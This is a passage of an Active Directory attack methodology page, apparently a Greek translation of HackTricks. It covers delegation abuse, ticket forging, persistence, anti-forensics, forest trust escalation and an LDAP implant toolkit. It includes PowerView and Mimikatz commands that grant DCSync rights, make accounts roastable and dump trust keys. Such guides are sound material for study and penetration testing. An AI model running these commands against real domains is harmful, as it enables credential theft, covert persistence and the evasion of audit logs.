> [!WARNING]
> Σημειώστε ότι αυτό είναι αρκετά **θορυβώδες** και το **LAPS** θα το **περιορίσει**.

### MSSQL Abuse & Trusted Links

Εάν ένας χρήστης έχει προνόμια για **πρόσβαση σε MSSQL instances**, μπορεί να τα χρησιμοποιήσει για να **εκτελέσει εντολές** στον MSSQL host (αν τρέχει ως SA), να **κλέψει** το NetNTLM **hash** ή ακόμη και να πραγματοποιήσει μια **relay** **attack**.\
Επιπλέον, αν ένα MSSQL instance είναι trusted (database link) από διαφορετικό MSSQL instance και ο χρήστης έχει προνόμια πάνω στη trusted βάση, θα μπορεί να **χρησιμοποιήσει τη σχέση εμπιστοσύνης για να εκτελέσει ερωτήματα και στην άλλη instance**. Αυτές οι σχέσεις εμπιστοσύνης μπορούν να αλυσσοποιηθούν και σε κάποιο σημείο ο χρήστης μπορεί να βρει μια λανθασμένα ρυθμισμένη βάση δεδομένων όπου μπορεί να εκτελέσει εντολές.\
**Οι σύνδεσμοι μεταξύ βάσεων δεδομένων λειτουργούν ακόμα και διαμέσου forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Εργαλεία τρίτων για inventory και deployment συχνά εκθέτουν ισχυρές διαδρομές προς credentials και code execution. Δείτε:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Αν βρείτε κάποιο Computer object με το attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) και έχετε domain privileges στον υπολογιστή, θα μπορείτε να κάνετε dump TGTs από τη μνήμη κάθε χρήστη που κάνει login στον υπολογιστή.\
Άρα, αν ένας **Domain Admin κάνει login στον υπολογιστή**, θα μπορείτε να κάνετε dump το TGT του και να τον impersonate χρησιμοποιώντας [Pass the Ticket](pass-the-ticket.md).\
Χάρη στο constrained delegation θα μπορούσατε ακόμη και να **αυτοματοποιημένα διαχειριστείτε έναν Print Server** (ελπίζουμε να είναι DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Αν ένας χρήστης ή υπολογιστής έχει άδεια για "Constrained Delegation" θα μπορεί να **impersonate οποιονδήποτε χρήστη για πρόσβαση σε κάποιες υπηρεσίες σε έναν υπολογιστή**.\
Στη συνέχεια, αν **compromise το hash** αυτού του χρήστη/υπολογιστή θα μπορείτε να **impersonate οποιονδήποτε χρήστη** (ακόμα και domain admins) για πρόσβαση σε υπηρεσίες.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Having **WRITE** privilege on an Active Directory object of a remote computer enables the attainment of code execution with **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Ο compromised χρήστης μπορεί να έχει κάποια **ενδιαφέροντα privileges πάνω σε αντικείμενα του domain** που θα μπορούσαν να σας επιτρέψουν να **κινηθείτε** lateral/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Η ανακάλυψη μιας **Spool service listening** εντός του domain μπορεί να **abused** για να **αποκτήσετε νέα credentials** και να **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Εάν **άλλοι χρήστες** **πρόσβαίνουν** στη **compromised** μηχανή, είναι δυνατό να **συλλέξετε credentials από τη μνήμη** και ακόμη να **inject beacons στις διεργασίες τους** για να τους impersonate.\
Συνήθως οι χρήστες θα έχουν πρόσβαση μέσω RDP, οπότε εδώ έχετε πώς να πραγματοποιήσετε μερικές επιθέσεις σε third party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

Το **LAPS** παρέχει ένα σύστημα για τη διαχείριση του **τοπικού κωδικού διαχειριστή (Local Administrator password)** σε domain-joined computers, εξασφαλίζοντας ότι είναι **τυχαίος**, μοναδικός και συχνά **αλλαγμένος**. Αυτοί οι κωδικοί αποθηκεύονται στο Active Directory και η πρόσβαση ελέγχεται μέσω ACLs μόνο σε εξουσιοδοτημένους χρήστες. Με επαρκή permissions για να αποκτήσετε πρόσβαση σε αυτούς τους κωδικούς, γίνεται δυνατή η pivoting σε άλλους υπολογιστές.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Η **συλλογή certificates** από τη compromised μηχανή μπορεί να είναι ένας τρόπος για escalation privileges μέσα στο περιβάλλον:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Αν υπάρχουν **ευάλωτα templates** ρυθμισμένα, είναι δυνατό να τα abuse για escalation privileges:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Μόλις αποκτήσετε **Domain Admin** ή ακόμα καλύτερα **Enterprise Admin** privileges, μπορείτε να **dump** τη **domain database**: _ntds.dit_.

[**Περισσότερες πληροφορίες για την DCSync attack βρίσκονται εδώ**](dcsync.md).

[**Περισσότερες πληροφορίες για το πώς να κλέψετε το NTDS.dit βρίσκονται εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Κάποιες από τις τεχνικές που συζητήθηκαν παραπάνω μπορούν να χρησιμοποιηθούν για persistence.\
Για παράδειγμα μπορείτε να:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Η **Silver Ticket attack** δημιουργεί ένα **legitimate Ticket Granting Service (TGS) ticket** για μια συγκεκριμένη υπηρεσία χρησιμοποιώντας το **NTLM hash** (για παράδειγμα, το **hash του PC account**). Αυτή η μέθοδος χρησιμοποιείται για να **έχετε πρόσβαση στα privileges της υπηρεσίας**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Μια **Golden Ticket attack** περιλαμβάνει την πρόσβαση του επιτιθέμενου στο **NTLM hash του krbtgt account** σε ένα Active Directory (AD) περιβάλλον. Αυτός ο λογαριασμός είναι ειδικός επειδή χρησιμοποιείται για το signing όλων των **Ticket Granting Tickets (TGTs)**, που είναι απαραίτητα για την authentication μέσα στο AD δίκτυο.

Μόλις ο επιτιθέμενος αποκτήσει αυτό το hash, μπορεί να δημιουργήσει **TGTs** για οποιονδήποτε λογαριασμό επιθυμεί (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Αυτά μοιάζουν με golden tickets αλλά κατασκευάζονται με τρόπο που **παρακάμπτει κοινά μηχανισμούς εντοπισμού για golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

Το **να έχετε certificates ενός λογαριασμού ή να μπορείτε να τα ζητήσετε** είναι ένας πολύ καλός τρόπος για να παραμείνετε persist στο λογαριασμό του χρήστη (ακόμα και αν αλλάξει τον κωδικό):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Χρησιμοποιώντας certificates είναι επίσης δυνατό να διατηρήσετε persistence με υψηλά privileges μέσα στο domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Το αντικείμενο **AdminSDHolder** στο Active Directory διασφαλίζει την ασφάλεια των **privileged groups** (όπως Domain Admins και Enterprise Admins) εφαρμόζοντας ένα τυπικό **Access Control List (ACL)** σε αυτές τις ομάδες για να αποτρέψει μη εξουσιοδοτημένες αλλαγές. Ωστόσο, αυτή η λειτουργία μπορεί να εκμεταλλευτεί· αν ένας επιτιθέμενος τροποποιήσει το ACL του AdminSDHolder για να δώσει πλήρη πρόσβαση σε έναν κανονικό χρήστη, αυτός ο χρήστης αποκτά εκτεταμένο έλεγχο σε όλες τις privileged ομάδες. Αυτό το μέτρο ασφαλείας, που σκοπό έχει την προστασία, μπορεί έτσι να γυρίσει μπούμερανγκ, επιτρέποντας μη δικαιολογημένη πρόσβαση εκτός αν παρακολουθείται στενά.

[**Περισσότερες πληροφορίες για την AdminDSHolder Group εδώ.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Σε κάθε **Domain Controller (DC)** υπάρχει ένας **τοπικός administrator** λογαριασμός. Αποκτώντας admin rights σε τέτοια μηχανή, το local Administrator hash μπορεί να εξαχθεί χρησιμοποιώντας **mimikatz**. Ακολούθως απαιτείται μια τροποποίηση registry για να **επιτραπεί η χρήση αυτού του κωδικού**, επιτρέποντας απομακρυσμένη πρόσβαση στον local Administrator account.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Μπορείτε να **δώσετε** κάποιες **ειδικές permissions** σε έναν **χρήστη** πάνω σε συγκεκριμένα domain αντικείμενα που θα επιτρέψουν στον χρήστη να **escalate privileges στο μέλλον**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Τα **security descriptors** χρησιμοποιούνται για να **αποθηκεύσουν** τα **permissions** που έχει ένα **αντικείμενο** πάνω σε ένα άλλο **αντικείμενο**. Αν μπορείτε απλά να κάνετε μια **μικρή αλλαγή** στο **security descriptor** ενός αντικειμένου, μπορείτε να αποκτήσετε πολύ ενδιαφέροντα privileges πάνω σε αυτό το αντικείμενο χωρίς να χρειάζεται να είστε μέλος μιας privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abuse the `dynamicObject` auxiliary class to create short-lived principals/GPOs/DNS records with `entryTTL`/`msDS-Entry-Time-To-Die`; they self-delete without tombstones, erasing LDAP evidence while leaving orphan SIDs, broken `gPLink` references, or cached DNS responses (e.g., AdminSDHolder ACE pollution or malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Τροποποιήστε τη **LSASS** στη μνήμη για να δημιουργήσετε έναν **universal password**, δίνοντας πρόσβαση σε όλους τους domain λογαριασμούς.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Μπορείτε να δημιουργήσετε το **δικό σας SSP** για να **capture** σε **clear text** τα **credentials** που χρησιμοποιούνται για πρόσβαση στη μηχανή.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Καταχωρεί έναν **νέο Domain Controller** στο AD και τον χρησιμοποιεί για να **ωθήσει attributes** (SIDHistory, SPNs...) σε συγκεκριμένα αντικείμενα **χωρίς** να αφήνει κάποιο **log** σχετικά με τις **τροποποιήσεις**. Χρειάζεστε DA privileges και να βρίσκεστε μέσα στο **root domain**.\
Σημειώστε ότι αν χρησιμοποιήσετε λάθος δεδομένα, θα εμφανιστούν αρκετά άσχημα logs.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Προηγουμένως συζητήσαμε πώς να αυξήσετε privileges αν έχετε **αρκετή άδεια να διαβάσετε LAPS passwords**. Ωστόσο, αυτοί οι κωδικοί μπορούν επίσης να χρησιμοποιηθούν για να **διατηρήσετε persistence**.\
Δείτε:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Η Microsoft θεωρεί το **Forest** ως το όριο ασφάλειας. Αυτό σημαίνει ότι **η παραβίαση ενός μόνο domain μπορεί δυνητικά να οδηγήσει σε παραβίαση ολόκληρου του Forest**.

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) είναι ένας μηχανισμός ασφάλειας που επιτρέπει σε έναν χρήστη από ένα **domain** να έχει πρόσβαση σε πόρους σε άλλο **domain**. Δημιουργεί ουσιαστικά ένα linkage μεταξύ των authentication systems των δύο domains, επιτρέποντας τη ροή ελέγχων authentication. Όταν τα domains δημιουργούν ένα trust, ανταλλάσσουν και διατηρούν συγκεκριμένα **keys** μέσα στους **Domain Controllers (DCs)**, που είναι κρίσιμα για την ακεραιότητα του trust.

Σε ένα τυπικό σενάριο, αν ένας χρήστης θέλει να έχει πρόσβαση σε μια υπηρεσία σε ένα **trusted domain**, πρέπει πρώτα να ζητήσει ένα ειδικό ticket γνωστό ως **inter-realm TGT** από τον DC του δικού του domain. Αυτό το TGT είναι κρυπτογραφημένο με ένα κοινό **key** που και τα δύο domains έχουν συμφωνήσει. Ο χρήστης στη συνέχεια παρουσιάζει αυτό το TGT στον **DC του trusted domain** για να λάβει ένα service ticket (**TGS**). Μετά την επιτυχή επαλήθευση του inter-realm TGT από τον DC του trusted domain, αυτός εκδίδει ένα TGS, δίνοντας στον χρήστη πρόσβαση στην υπηρεσία.

**Βήματα**:

1. A **client computer** in **Domain 1** starts the process by using its **NTLM hash** to request a **Ticket Granting Ticket (TGT)** from its **Domain Controller (DC1)**.
2. DC1 issues a new TGT if the client is authenticated successfully.
3. The client then requests an **inter-realm TGT** from DC1, which is needed to access resources in **Domain 2**.
4. The inter-realm TGT is encrypted with a **trust key** shared between DC1 and DC2 as part of the two-way domain trust.
5. The client takes the inter-realm TGT to **Domain 2's Domain Controller (DC2)**.
6. DC2 verifies the inter-realm TGT using its shared trust key and, if valid, issues a **Ticket Granting Service (TGS)** for the server in Domain 2 the client wants to access.
7. Finally, the client presents this TGS to the server, which is encrypted with the server’s account hash, to get access to the service in Domain 2.

### Different trusts

Είναι σημαντικό να παρατηρήσετε ότι **ένα trust μπορεί να είναι 1 way ή 2 ways**. Στην επιλογή 2 ways, και τα δύο domains θα εμπιστεύονται το ένα το άλλο, αλλά στη **μία κατεύθυνση** (1 way) η μία από τις domains θα είναι η **trusted** και η άλλη η **trusting** domain. Στην τελευταία περίπτωση, **θα μπορείτε να έχετε πρόσβαση μόνο σε πόρους μέσα στο trusting domain από το trusted domain**.

Αν το Domain A trusts το Domain B, το A είναι το trusting domain και το B είναι το trusted. Επιπλέον, στο **Domain A**, αυτό θα είναι ένα **Outbound trust**· και στο **Domain B**, αυτό θα είναι ένα **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Αυτό είναι μια συνηθισμένη ρύθμιση μέσα στο ίδιο forest, όπου ένα child domain έχει αυτόματα two-way transitive trust με το parent domain. Ουσιαστικά, αυτό σημαίνει ότι τα authentication requests μπορούν να ρέουν απρόσκοπτα μεταξύ parent και child.
- **Cross-link Trusts**: Αναφερόμενα ως "shortcut trusts," δημιουργούνται μεταξύ child domains για να επιταχύνουν τις διαδικασίες referral. Σε σύνθετα forests, οι authentication referrals συνήθως πρέπει να ταξιδέψουν μέχρι τη ρίζα του forest και μετά κάτω στο target domain. Με τη δημιουργία cross-links, η διαδρομή συντομεύει, κάτι που είναι ιδιαίτερα χρήσιμο σε γεωγραφικά διασπαρμένα περιβάλλοντα.
- **External Trusts**: Αυτά ρυθμίζονται μεταξύ διαφορετικών, μη συγγενικών domains και από τη φύση τους είναι non-transitive. Σύμφωνα με την [τεκμηρίωση της Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), τα external trusts είναι χρήσιμα για την πρόσβαση σε πόρους σε domain έξω από το τρέχον forest που δεν συνδέεται με forest trust. Η ασφάλεια ενισχύεται μέσω SID filtering με external trusts.
- **Tree-root Trusts**: Αυτά τα trusts δημιουργούνται αυτόματα μεταξύ του forest root domain και ενός νέου tree root. Αν και δεν εμφανίζονται συχνά, τα tree-root trusts είναι σημαντικά για την προσθήκη νέων domain trees σε ένα forest, επιτρέποντάς τους να διατηρήσουν μοναδικό domain name και εξασφαλίζοντας two-way transitivity. Περισσότερες πληροφορίες υπάρχουν στον [οδηγό της Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Αυτός ο τύπος είναι ένα two-way transitive trust μεταξύ δύο forest root domains, εφαρμόζοντας επίσης SID filtering για την ενίσχυση των μέτρων ασφαλείας.
- **MIT Trusts**: Αυτά τα trusts δημιουργούνται με non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. Τα MIT trusts είναι πιο εξειδικευμένα και εξυπηρετούν περιβάλλοντα που απαιτούν ολοκλήρωση με Kerberos-based συστήματα εκτός του Windows οικοσυστήματος.

#### Other differences in **trusting relationships**

- Μια trust relationship μπορεί επίσης να είναι **transitive** (A trust B, B trust C, τότε A trust C) ή **non-transitive**.
- Μια trust relationship μπορεί να ρυθμιστεί ως **bidirectional trust** (αμοιβαία εμπιστοσύνη) ή ως **one-way trust** (μόνο το ένα εμπιστεύεται το άλλο).

### Attack Path

1. **Enumerate** the trusting relationships
2. Check if any **security principal** (user/group/computer) has **access** to resources of the **other domain**, maybe by ACE entries or by being in groups of the other domain. Look for **relationships across domains** (the trust was created for this probably).
1. kerberoast in this case could be another option.
3. **Compromise** the **accounts** which can **pivot** through domains.

Attackers with could access to resources in another domain through three primary mechanisms:

- **Local Group Membership**: Principals might be added to local groups on machines, such as the “Administrators” group on a server, granting them significant control over that machine.
- **Foreign Domain Group Membership**: Principals can also be members of groups within the foreign domain. However, the effectiveness of this method depends on the nature of the trust and the scope of the group.
- **Access Control Lists (ACLs)**: Principals might be specified in an **ACL**, particularly as entities in **ACEs** within a **DACL**, providing them access to specific resources. For those looking to dive deeper into the mechanics of ACLs, DACLs, and ACEs, the whitepaper titled “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” is an invaluable resource.

### Find external users/groups with permissions

You can check **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** to find foreign security principals in the domain. These will be user/group from **an external domain/forest**.

You could check this in **Bloodhound** or using powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent δάσος privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Άλλοι τρόποι για να enumerate domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Υπάρχουν **2 trusted keys**, μία για _Child --> Parent_ και άλλη για _Parent_ --> _Child_.\
> Μπορείτε να δείτε ποια χρησιμοποιείται από το τρέχον domain με:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Ανεβαίνετε ως Enterprise admin στο child/parent domain εκμεταλλευόμενοι το trust με SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Εκμετάλλευση εγγράψιμης Configuration NC

Είναι κρίσιμο να κατανοήσουμε πώς μπορεί να εκμεταλλευτεί το Configuration Naming Context (NC). Το Configuration NC λειτουργεί ως κεντρικό αποθετήριο για δεδομένα διαμόρφωσης σε όλο το forest σε περιβάλλοντα Active Directory (AD). Αυτά τα δεδομένα αντιγράφονται σε κάθε Domain Controller (DC) εντός του forest, με τους writable DCs να διατηρούν ένα εγγράψιμο αντίγραφο του Configuration NC. Για να το εκμεταλλευτεί κανείς, απαιτούνται **SYSTEM privileges σε έναν DC**, κατά προτίμηση ένας child DC.

**Σύνδεση GPO στο root DC site**

Το Sites container του Configuration NC περιλαμβάνει πληροφορίες για τα sites όλων των domain-joined υπολογιστών μέσα στο AD forest. Με λειτουργία με **SYSTEM privileges** σε οποιονδήποτε DC, οι επιτιθέμενοι μπορούν να συνδέσουν GPOs στα root DC sites. Αυτή η ενέργεια ενδεχομένως θέτει σε κίνδυνο το root domain χειραγωγώντας τις policies που εφαρμόζονται σε αυτά τα sites.

Για λεπτομερή πληροφορία, μπορείτε να εξερευνήσετε την έρευνα για [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Ένας διανυσματικός τρόπος επίθεσης περιλαμβάνει το στοχεύσιμο σε privileged gMSAs εντός του domain. Το KDS Root key, απαραίτητο για τον υπολογισμό των κωδικών των gMSAs, αποθηκεύεται μέσα στο Configuration NC. Με **SYSTEM privileges** σε οποιονδήποτε DC, είναι δυνατό να αποκτήσει κανείς πρόσβαση στο KDS Root key και να υπολογίσει τους κωδικούς για οποιοδήποτε gMSA σε όλο το forest.

Λεπτομερής ανάλυση και βήμα-προς-βήμα οδηγίες μπορείτε να βρείτε στο:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Συμπληρωματική επίθεση σε delegated MSA (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Επιπρόσθετη εξωτερική έρευνα: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Αυτή η μέθοδος απαιτεί υπομονή, αναμένοντας τη δημιουργία νέων privileged AD objects. Με **SYSTEM privileges**, ένας επιτιθέμενος μπορεί να τροποποιήσει το AD Schema ώστε να δώσει σε οποιονδήποτε χρήστη πλήρη έλεγχο σε όλες τις κλάσεις. Αυτό θα μπορούσε να οδηγήσει σε μη εξουσιοδοτημένη πρόσβαση και έλεγχο των νεοδημιουργούμενων AD objects.

Για περαιτέρω ανάγνωση δείτε [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Η ευπάθεια ADCS ESC5 στοχεύει τον έλεγχο επί αντικειμένων του Public Key Infrastructure (PKI) για να δημιουργήσει ένα certificate template που επιτρέπει authentication ως οποιοσδήποτε χρήστης μέσα στο forest. Εφόσον τα PKI objects βρίσκονται στο Configuration NC, ο συμβιβασμός ενός writable child DC επιτρέπει την εκτέλεση ESC5 attacks.

Μπορείτε να διαβάσετε περισσότερες λεπτομέρειες στο [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Σε σενάρια χωρίς ADCS, ο επιτιθέμενος έχει τη δυνατότητα να εγκαταστήσει τα απαραίτητα στοιχεία, όπως συζητείται στο [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### Εξωτερικό Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Σε αυτό το σενάριο **your domain is trusted** από ένα εξωτερικό domain που σας παρέχει **undetermined permissions** επ' αυτού. Θα πρέπει να βρείτε **which principals of your domain have which access over the external domain** και στη συνέχεια να προσπαθήσετε να τα exploit:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Σε αυτό το σενάριο **το domain σας** εμπιστεύεται κάποια **privileges** σε principal από **διαφορετικά domains**.

Ωστόσο, όταν ένα **domain εμπιστεύεται** από το trusting domain, το trusted domain **δημιουργεί έναν χρήστη** με ένα **προβλέψιμο όνομα** που χρησιμοποιεί ως **password το trusted password**. Αυτό σημαίνει ότι είναι δυνατό να **πρόσβαση σε έναν χρήστη από το trusting domain για να μπεις στο trusted domain** για να το εξερευνήσεις και να προσπαθήσεις να ανεβάσεις περισσότερα προνόμια:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Ένας άλλος τρόπος για να συμβιβαστεί το trusted domain είναι να βρεθεί ένας [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) που έχει δημιουργηθεί στην **αντίθετη κατεύθυνση** της domain trust (κάτι που δεν είναι πολύ συνηθισμένο).

Άλλος τρόπος για να συμβιβαστεί το trusted domain είναι να περιμένει ο attacker σε μια μηχανή όπου ένας **user από το trusted domain μπορεί να κάνει login** μέσω **RDP**. Στη συνέχεια, ο attacker μπορεί να εγχύσει κώδικα στη διαδικασία της RDP session και να **προσπελάσει το origin domain του θύματος** από εκεί.\
Επιπλέον, αν το **θύμα έχει προσαρτήσει τον σκληρό του δίσκο**, από τη διαδικασία της **RDP session** ο attacker θα μπορούσε να αποθηκεύσει **backdoors** στο **φάκελο εκκίνησης του σκληρού δίσκου**. Αυτή η τεχνική ονομάζεται **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Ο κίνδυνος επιθέσεων που αξιοποιούν το SID history attribute σε forest trusts μετριάζεται από το SID Filtering, το οποίο είναι ενεργοποιημένο εξ ορισμού σε όλες τις inter-forest trusts. Αυτό στηρίζεται στην υπόθεση ότι οι intra-forest trusts είναι ασφαλείς, θεωρώντας το forest, αντί του domain, ως το όριο ασφάλειας σύμφωνα με τη θέση της Microsoft.
- Ωστόσο, υπάρχει ένα ζήτημα: το SID filtering μπορεί να διαταράξει εφαρμογές και πρόσβαση χρηστών, οδηγώντας μερικές φορές στην απενεργοποίησή του.

### **Selective Authentication:**

- Για inter-forest trusts, η χρήση του Selective Authentication εξασφαλίζει ότι οι χρήστες από τα δύο forests δεν αυθεντικοποιούνται αυτόματα. Αντίθετα, απαιτούνται ρητές άδειες για να έχουν οι χρήστες πρόσβαση σε domains και servers εντός του trusting domain ή forest.
- Είναι σημαντικό να σημειωθεί ότι αυτά τα μέτρα δεν προστατεύουν από την εκμετάλλευση του writable Configuration Naming Context (NC) ή από επιθέσεις στον trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

Το [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) επανυλοποιεί τις bloodyAD-style LDAP primitives ως x64 Beacon Object Files που εκτελούνται εξ ολοκλήρου μέσα σε ένα on-host implant (π.χ. Adaptix C2). Οι operators μεταγλωττίζουν το πακέτο με `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, φορτώνουν `ldap.axs`, και μετά καλούν `ldap <subcommand>` από το beacon. Όλη η κίνηση ταξιδεύει με το τρέχον logon security context πάνω σε LDAP (389) με signing/sealing ή LDAPS (636) με αυτόματη εμπιστοσύνη πιστοποιητικού, οπότε δεν απαιτούνται socks proxies ή disk artifacts.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` επιλύουν σύντομα ονόματα/OU paths σε πλήρη DNs και εξάγουν τα αντίστοιχα αντικείμενα.
- `get-object`, `get-attribute`, and `get-domaininfo` ανακτούν αυθαίρετα attributes (συμπεριλαμβανομένων των security descriptors) καθώς και τα forest/domain metadata από το `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` αποκαλύπτουν roasting candidates, delegation settings, και υπάρχοντες [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors απευθείας από το LDAP.
- `get-acl` and `get-writable --detailed` αναλύουν το DACL για να απαριθμήσουν trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), και inheritance, δίνοντας άμεσα targets για ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives για escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) επιτρέπουν στον χειριστή να τοποθετήσει νέους principals ή machine accounts όπου υπάρχουν δικαιώματα OU. `add-groupmember`, `set-password`, `add-attribute`, and `set-attribute` καταλαμβάνουν απευθείας στόχους μόλις βρεθούν write-property rights.
- Εντολές επικεντρωμένες σε ACL όπως `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, και `add-dcsync` μεταφράζουν WriteDACL/WriteOwner σε οποιοδήποτε AD αντικείμενο σε επαναφορές password, έλεγχο group membership, ή προνόμια DCSync χωρίς να αφήνουν PowerShell/ADSI artifacts. Οι αντίστοιχες `remove-*` εντολές καθαρίζουν τα εγχυμένα ACEs.

### Delegation, roasting, and Kerberos abuse

